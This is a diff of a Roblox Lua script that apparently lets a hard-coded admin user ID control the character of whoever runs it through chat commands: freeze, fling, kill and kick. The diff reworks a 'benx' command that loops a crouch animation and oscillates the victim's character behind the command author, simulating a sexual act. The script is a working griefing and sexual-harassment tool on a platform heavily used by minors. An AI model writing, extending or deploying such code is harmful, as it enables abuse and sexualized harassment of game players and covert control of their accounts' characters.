@@ -2,7 +2,7 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 
 local Admins = {
-    2200043156,
+    2200043156, ---Airsoft
 }
 
 local function commands(msg, plr)
@@ -16,10 +16,6 @@ local function commands(msg, plr)
             if string.find(SplitCMD[1], ":freeze") then
                 player.Character.HumanoidRootPart.Anchored = true
             end
-            if string.find(SplitCMD[1], ":bring") then
-            local plr = game.Players.LocalPlayer
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
-            end
             if string.find(SplitCMD[1], ":unfreeze") then
                 player.Character.HumanoidRootPart.Anchored = false
             end
@@ -28,48 +24,6 @@ local function commands(msg, plr)
             end
             if string.find(SplitCMD[1], ":fling") then
                 player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-            end
-            if string.find(SplitCMD[1], ":benx") then
-                bending = true
-                local segtarget = author.Name
-                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
-                Crouch.Looped = true
-                Crouch:Play()
-                local away = .5
-                local reversing = false
-                local Loop
-                local loopFunction = function()
-                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
-                    local character = player.Character
-                    if targetchar then
-                        if reversing == true then
-                            away = away - 0.1
-                        else
-                            away = away + 0.1
-                        end
-                        if away >= 2 then
-                            reversing = true
-                        elseif away < 0.5 then
-                            reversing = false
-                        end
-                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
-                    end
-                end;
-                local Start = function()
-                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
-                end;
-                local Pause = function()
-                    Loop:Disconnect()
-                    Crouch:Stop()
-                end;
-                Start()	
-                repeat wait() until bending == false
-                Pause()
-            end
-            if string.find(SplitCMD[1], ":unbenx") then
-            while bending == true do
-            wait()
-            bending = false
             end
             if string.find(SplitCMD[1], ":kill") then
                local plr = game.Players.LocalPlayer
@@ -121,6 +75,54 @@ local function commands(msg, plr)
                     Scare()
                 end
             end
+        if message:sub(1, 5) == "!benx" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                bending = true
+                local segtarget = author.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+        end
+        
+        if message:sub(1, 7) == "!unbenx" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+        end
             if string.find(SplitCMD[1], ":kick") then
                 local ISADMIN = table.find(Admins, player.UserId)
                 if not ISADMIN then
